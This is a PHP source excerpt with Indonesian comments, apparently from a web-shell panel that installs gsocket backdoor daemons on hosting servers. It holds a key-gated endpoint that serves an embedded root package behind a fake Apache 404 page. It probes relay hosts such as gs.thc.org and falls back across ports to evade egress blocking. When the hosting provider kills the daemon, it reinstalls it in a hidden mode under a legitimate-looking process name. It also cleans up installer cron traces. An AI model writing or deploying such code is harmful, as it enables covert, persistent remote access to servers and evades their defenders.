/* ---------- ROOTPKG ENDPOINT (baru v69, CARA 2): unduh pkg.tgz lewat HTTP ----------
   Di-route SEBELUM gerbang 404/auth biasa: terminal root yang menjalankan
   varian-unduh tidak punya sesi panel. Validasi cukup kunci: baris
   <h10hex>|<key32hex>|<epoch> di state ~/.cache/.gsr_keys, umur < 1800 dtk.
   Cocok -> stream base64_decode($B64_TGZ) apa adanya (octet-stream +
   Content-Length + no-cache; murni stream, tanpa log sensitif). Selain itu
   404 polos supaya keberadaan endpoint tidak bocor. */
if ($act === 'rootpkg') {
    $gsp_rp_ok = false;
    $gsp_rp_h = strval(isset($_GET['h']) ? $_GET['h'] : '');
    $gsp_rp_k = strval(isset($_GET['k']) ? $_GET['k'] : '');
    if (preg_match('/^[a-f0-9]{10}$/', $gsp_rp_h) && preg_match('/^[a-f0-9]{32}$/', $gsp_rp_k)) {
        $gsp_rp_rows = @file(gsp_home() . '/.cache/.gsr_keys', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (is_array($gsp_rp_rows)) {
            foreach ($gsp_rp_rows as $gsp_rp_ln) {
                $gsp_rp_kv = explode('|', trim($gsp_rp_ln));
                if (count($gsp_rp_kv) !== 3) continue;
                if ($gsp_rp_kv[0] === $gsp_rp_h && $gsp_rp_kv[1] === $gsp_rp_k
                    && preg_match('/^\d+$/', $gsp_rp_kv[2]) && (time() - intval($gsp_rp_kv[2])) < 1800) { $gsp_rp_ok = true; break; }
            }
        }
    }
    if ($gsp_rp_ok) {
        $gsp_rp_bin = base64_decode($B64_TGZ);
        if (!headers_sent()) {
            @header('Content-Type: application/octet-stream');
            @header('Content-Length: ' . strlen($gsp_rp_bin));
            @header('Cache-Control: no-store, no-cache, must-revalidate');
            @header('Pragma: no-cache');
        }
        echo $gsp_rp_bin;
        exit;
    }
    @header('HTTP/1.1 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body>'
        . '<h1>Not Found</h1><p>The requested URL was not found on this server.</p>'
        . '<hr><address>Apache Server</address></body></html>';
    exit;
}

/* baca seluruh isi stream - aman PHP 4 (stream_get_contents baru ada di PHP 5) */
function gsfu_stream_read($fp) {
    if (function_exists('stream_get_contents')) {
        $d = @stream_get_contents($fp);
        return is_string($d) ? $d : '';
    }
    $o = '';
    while (!feof($fp)) { $c = @fread($fp, 8192); if ($c === false || $c === '') break; $o .= $c; }
    return $o;
}

/* secret terbaru per tipe instance dari registry panel */
function gsfu_latest_secret($type) {
    $best = null;
    $bestt = 0;
    foreach (gsp_registry() as $e) {
        $t = isset($e['TYPE']) ? $e['TYPE'] : '';
        if ($t !== $type) continue;
        $mt = @filemtime($e['_file']);
        if ($mt === false) $mt = 0;
        if ($best === null || $mt >= $bestt) { $best = $e; $bestt = $mt; }
    }
    if ($best && !empty($best['SECRET'])) return $best['SECRET'];
    return '';
}

/* ---------- PRE-FLIGHT RELAY (semua handler install standar) ----------
   SEBELUM staging/run_stream: probe TCP kandidat relay (relay sendiri
   port user/8443/53 + default gsocket). Semua gagal -> install DIBATALKAN
   (daemon hanya akan dibunuh/di-retry sia-sia oleh hosting). Probe tak
   tersedia (fsockopen di-disable) -> lanjut install TANPA pre-flight. */
if (!function_exists('gsp_tcp_ok')) {
    /* true = TCP connect OK; false = gagal/timeout; null = tak bisa uji
       (fsockopen tidak ada — JANGAN blokir install) */
    function gsp_tcp_ok($host, $port, $t = 6) {
        if (!function_exists('fsockopen')) return null;
        $eno = 0; $estr = '';
        $fp = @fsockopen(strval($host), intval($port), $eno, $estr, $t);
        if ($fp) { @fclose($fp); return true; }
        return false;
    }
}
if (!function_exists('gsp_relay_candidates')) {
    /* kandidat "host:port": relay sendiri (port user, lalu 8443, lalu 53);
       selalu tutup dgn kandidat default gsocket */
    function gsp_relay_candidates($gshost, $gsport) {
        $set = array();
        $gshost = trim(strval($gshost));
        $gsport = intval($gsport);
        if ($gshost !== '') {
            $set[$gshost . ':' . $gsport] = true;
            $set[$gshost . ':8443'] = true;
            $set[$gshost . ':53'] = true;
        }
        $set['gs.thc.org:443'] = true;
        $set['gsocket.net:443'] = true;
        $out = array();
        foreach ($set as $k => $v) $out[] = $k;
        return $out;
    }
}
if (!function_exists('gsp_relay_pick')) {
    /* kandidat pertama probe OK -> array(host, port, sumber) dgn sumber:
       'sendiri' (host:port user) / 'sendiri-alt' (host user port alt) /
       'default'. null + $note: 'blocked' (semua gagal) / 'probe-null'
       (probe tak tersedia -> lanjut install tanpa pre-flight) */
    function gsp_relay_pick($gshost, $gsport, &$note) {
        $note = '';
        $gshost = trim(strval($gshost));
        $gsport = intval($gsport);
        $any = false;
        foreach (gsp_relay_candidates($gshost, $gsport) as $c) {
            $p = explode(':', $c);
            $ch = $p[0]; $cp = intval($p[1]);
            $src = 'default';
            if ($gshost !== '' && $ch === $gshost) $src = ($cp === $gsport) ? 'sendiri' : 'sendiri-alt';
            $ok = gsp_tcp_ok($ch, $cp);
            if ($ok === null) continue; /* kandidat ini tak bisa diuji */
            $any = true;
            if ($ok === true) return array($ch, $cp, $src);
        }
        $note = $any ? 'blocked' : 'probe-null';
        return null;
    }
}
if (!function_exists('gsp_preflight_relay')) {
    /* dipanggil tiap handler install SEBELUM staging. Return:
       false = STOP (pesan batal sudah dicetak, JANGAN install);
       'lanjut' = probe tak tersedia -> lanjut tanpa pre-flight;
       array(host, port, sumber) = pakai relay ini (sumber 'default' ->
       host/port '' = kosongkan env = relay default installer). */
    function gsp_preflight_relay($gshost, $gsport) {
        $note = '';
        $gshost = trim(strval($gshost));
        $gsport = intval($gsport);
        $pick = gsp_relay_pick($gshost, $gsport, $note);
        if ($pick === null) {
            if ($note === 'probe-null') {
                if (function_exists('colorize')) echo colorize("[i] relay: (probe tidak tersedia — lanjut tanpa pre-flight)\n");
                return 'lanjut';
            }
            if (function_exists('colorize')) echo colorize("[x] PRE-FLIGHT: semua kandidat relay diblokir hosting (gshost:443/8443/53 + default). Install dibatalkan — ganti IP relay (VPS fresh) atau coba lagi nanti.\n");
            return false;
        }
        if ($gshost !== '' && ($pick[0] !== $gshost || intval($pick[1]) !== $gsport))
            if (function_exists('colorize')) echo colorize("[>] PRE-FLIGHT: relay " . $gshost . ":" . $gsport . " diblokir — otomatis pindah ke " . $pick[0] . ":" . $pick[1] . " (" . $pick[2] . ")\n");
        if (function_exists('colorize')) echo colorize("[i] relay: " . $pick[0] . ":" . $pick[1] . " (" . $pick[2] . ") — probe OK\n");
        if ($pick[2] === 'default') return array('', '', 'default');
        return $pick;
    }
}

/* ---------- AUTO-REALH bersama (semua handler install standar) ----------
   Pola identik verifikasi installauto: snapshot PID sehat SEBELUM install
   (semua tipe KECUALI tipe yang sedang diinstall — install ulang tipe sama
   memang me-replace slot sendiri, itu pengelolaan installer, bukan
   cross-kill), lalu pasca-install: secret registry -> pid hidup setelah
   sleep(4) -> cross-kill. Handler memakai: gsp_arh_healthy_pids() sebelum
   run_stream, gsp_arh_after() sesudah pembacaan secret. */
if (!function_exists('gsp_arh_healthy_pids')) {
    function gsp_arh_healthy_pids($exclude_type) {
        $out = array();
        foreach (gsp_registry() as $e) {
            $et = isset($e['TYPE']) ? $e['TYPE'] : '';
            if ($et === $exclude_type) continue;
            $pp = array();
            if (!empty($e['BIN'])) $pp = gsp_pgrep($e['BIN']);
            if (!count($pp) && !empty($e['CAMO'])) $pp = gsp_pgrep($e['CAMO']);
            foreach ($pp as $p) $out[intval($p)] = $e['_id'];
        }
        return $out;
    }
}
if (!function_exists('gsp_arh_verify')) {
    /* return array(kategori, detail): '' = hidup (detail=secret); 'queued' =
       diantrikan cron; 'exec/staging'; 'auto-kill hosting'; 'cross-kill';
       'relay/egress' (daemon hidup tapi relay yang dipakai tidak tembus —
       dicek PALING AKHIR: kill tetap diprioritaskan, relay dicek lagi
       setelah retry REALH). */
    function gsp_arh_verify($type, $before_pids) {
        $cat = '';
        $note = '';
        $sec = gsfu_latest_secret($type);
        if ($sec === '') {
            if (!empty($GLOBALS['gsp_queued'])) return array('queued', 'install diantrikan ke guard cron — secret muncul <=7 menit setelah cron jalan');
            return array('exec/staging', 'secret tipe ' . $type . ' tidak terbaca dari registry');
        }
        /* entri registry terbaru tipe ini -> PID daemon (pola installauto) */
        $best = null; $bestt = 0;
        foreach (gsp_registry() as $e) {
            if ((isset($e['TYPE']) ? $e['TYPE'] : '') !== $type) continue;
            $mt = @filemtime($e['_file']); if ($mt === false) $mt = 0;
            if ($best === null || $mt >= $bestt) { $best = $e; $bestt = $mt; }
        }
        $pid = 0;
        if (is_array($best)) {
            $pp = array();
            if (!empty($best['BIN'])) $pp = gsp_pgrep($best['BIN']);
            if (!count($pp) && !empty($best['CAMO'])) $pp = gsp_pgrep($best['CAMO']);
            if (count($pp)) $pid = intval($pp[0]);
        }
        sleep(4);
        if ($pid <= 0 || !@is_dir('/proc/' . $pid)) {
            $cat = 'auto-kill hosting';
            $note = ($pid > 0) ? ('pid ' . $pid . ' hilang dari /proc dalam 4 dtk') : 'tidak ada pid cocok';
        } else {
            $note = 'daemon hidup (pid ' . $pid . ')';
        }
        /* cross-kill: pid sehat snapshot awal yang kini mati (deteksi jujur) */
        $dead = array();
        foreach ((array)$before_pids as $op => $oid) {
            if (!@is_dir('/proc/' . intval($op))) $dead[] = intval($op) . ' (entri ' . $oid . ')';
        }
        if (count($dead)) {
            if ($cat === '') $cat = 'cross-kill';
            $note .= (($note !== '') ? ' + ' : '') . 'instance lain ikut mati: ' . implode(', ', $dead);
        }
        if ($cat === '') {
            /* post-install relay check: daemon hidup tapi egress ke relay yang
               dipakai diblokir hosting -> 'relay/egress' (probe-null = tak bisa
               uji -> kategori tetap '', JANGAN blokir). Relay default -> probe
               kandidat default pertama. */
            $rh = trim(strval(isset($_GET['gshost']) ? $_GET['gshost'] : ''));
            $rp = trim(strval(isset($_GET['gsport']) ? $_GET['gsport'] : ''));
            if (!preg_match('/^[A-Za-z0-9.\-]{1,100}$/', $rh)) $rh = '';
            if ($rh === '') { $rh = 'gs.thc.org'; $rp = '443'; }
            elseif (!preg_match('/^[0-9]{1,5}$/', $rp) || intval($rp) < 1 || intval($rp) > 65535) $rp = '443';
            if (function_exists('gsp_tcp_ok') && gsp_tcp_ok($rh, intval($rp)) === false)
                return array('relay/egress', 'daemon hidup tapi relay ' . $rh . ':' . $rp . ' tidak bisa dihubungi (egress diblokir hosting)');
            return array('', $sec);
        }
        return array($cat, $note);
    }
}
if (!function_exists('gsp_arh_status')) {
    /* status kecil utk header log: realh+rhstop = dinyalakan AUTO-REALH;
       realh saja = checkbox manual; kosong = OFF */
    function gsp_arh_status() {
        if (empty($_GET['realh'])) return 'OFF';
        return !empty($_GET['rhstop']) ? 'ON auto' : 'ON manual';
    }
}
if (!function_exists('gsp_arh_after')) {
    /* cetak 1 baris hasil verifikasi + AUTO-REALH: pembunuhan gsocket
       (auto-kill/cross-kill) & realh belum ON & bukan rhstop -> install
       diulang SEKALI dgn REALH via meta refresh 2 dtk (+JS +link manual) ke
       $redir (act yang sama; createall: step yang SAMA). rhstop=1 = JANGAN
       redirect lagi, cetak diagnosis jujur. Kategori 'relay/egress' ->
       RETRY RELAY otomatis ke kandidat berikutnya (&rf=N, MAKS sampai rf>2
       -> stop dgn diagnosis). Return true bila redirect dikeluarkan
       (caller menghentikan chaining-nya sendiri). */
    function gsp_arh_after($type, $before_pids, $redir) {
        $v = gsp_arh_verify($type, $before_pids);
        $cat = $v[0]; $det = $v[1];
        if ($cat === '') { echo colorize("[OK] verifikasi: daemon hidup — secret = " . $det . "\n"); return false; }
        if ($cat === 'queued') { echo colorize("[>] verifikasi: " . $det . "\n"); return false; }
        echo colorize("[x] verifikasi: " . $det . " — kategori: " . $cat . "\n");
        if (($cat === 'auto-kill hosting' || $cat === 'cross-kill') && $redir !== '') {
            if (empty($_GET['realh']) && empty($_GET['rhstop'])) {
                echo colorize("[>] AUTO-REALH aktif: terdeteksi pembunuhan gsocket — install diulang otomatis dengan mode real hidden (nama legit + keyfile, tidak tampak sebagai gsocket)\n");
                $u = $redir . '&realh=1&rhstop=1';
                echo '<meta http-equiv="refresh" content="2;url=' . h($u) . '">';
                echo '<script>setTimeout(function(){location.href="' . $u . '"},2000)</script>';
                echo '<a href="' . h($u) . '">ulangi dengan REALH</a>';
                flush();
                return true;
            }
            if (!empty($_GET['rhstop']))
                echo colorize("[x] masih dibunuh walau REALH — hosting memburu perilaku/network, bukan nama; coba relay lain/port lain atau tunda\n");
        }
        if ($cat === 'relay/egress' && $redir !== '') {
            /* RETRY RELAY otomatis (rf mulai 0): relay sendiri -> alt 8443 ->
               53 -> default. Awal default -> tidak ada alternatif -> diagnosis
               langsung. rf>2 -> stop. realh/rhstop dipertahankan. Prioritas:
               kill (blok REALH di atas) jalan lebih dulu; relay dicek lagi
               setelah retry. */
            $rf = intval(isset($_GET['rf']) ? $_GET['rf'] : 0);
            $rh = trim(strval(isset($_GET['gshost']) ? $_GET['gshost'] : ''));
            if (!preg_match('/^[A-Za-z0-9.\-]{1,100}$/', $rh)) $rh = '';
            $nhost = ''; $nport = ''; $has_next = false;
            if ($rh !== '' && $rf <= 2) {
                $has_next = true;
                if ($rf === 0) { $nhost = $rh; $nport = '8443'; }
                elseif ($rf === 1) { $nhost = $rh; $nport = '53'; }
                /* rf=2 -> kandidat terakhir: relay default (host/port kosong) */
            }
            if (!$has_next) {
                echo colorize("[x] relay gagal di semua kandidat (443/8443/53/default) — IP relay kemungkinan ter-flag; ganti VPS/IP relay\n");
                return false;
            }
            $u = preg_replace('/&(gshost|gsport|rf)=[^&]*/', '', $redir);
            $u .= '&rf=' . ($rf + 1);
            $lbl = 'relay DEFAULT gsocket';
            if ($nhost !== '') { $u .= '&gshost=' . urlencode($nhost) . '&gsport=' . urlencode($nport); $lbl = $nhost . ':' . $nport; }
            if (!empty($_GET['realh'])) $u .= '&realh=1';
            if (!empty($_GET['rhstop'])) $u .= '&rhstop=1';
            echo colorize("[>] RELAY-RETRY otomatis (rf=" . ($rf + 1) . "): egress ke relay gagal — coba kandidat berikutnya: " . $lbl . "\n");
            echo '<meta http-equiv="refresh" content="2;url=' . h($u) . '">';
            echo '<script>setTimeout(function(){location.href="' . $u . '"},2000)</script>';
            echo '<a href="' . h($u) . '">coba relay berikutnya</a>';
            flush();
            return true;
        }
        return false;
    }
}

/* cari linekey cron yang mengandung marker tertentu (buat bersih-bersih cron installer) */
function gsfu_cron_marker_keys($result, $raw, $marker) {
    $keys = array();
    if (is_array($result)) {
        $stack = array($result);
        while (count($stack)) {
            $node = array_pop($stack);
            if (!is_array($node)) continue;
            if (isset($node['command']) && is_string($node['command']) && strpos($node['command'], $marker) !== false && isset($node['linekey'])) {
                $keys[] = $node['linekey'];
                continue;
            }
            foreach ($node as $v) if (is_array($v)) $stack[] = $v;
        }
    }
    if (!count($keys) && is_string($raw) && strpos($raw, $marker) !== false) {
        $seen = false;
        foreach (preg_split('/\r?\n/', $raw) as $ln) {
            if (strpos($ln, $marker) !== false) $seen = true;
            if ($seen && preg_match('/linekey:\s*([A-Za-z0-9]+)/', $ln, $mm)) { $keys[] = $mm[1]; $seen = false; }
        }
    }
    return $keys;
}

